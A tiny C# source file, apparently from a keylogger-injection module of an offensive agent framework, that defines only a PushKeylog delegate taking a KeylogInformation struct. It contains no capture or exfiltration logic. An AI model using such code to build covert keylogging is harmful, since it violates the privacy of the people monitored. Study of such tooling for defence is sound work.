using ApolloInterop.Structs.ApolloStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace KeylogInject
{
    public static class Delegates
    {
        public delegate void PushKeylog(KeylogInformation info);
    }
}
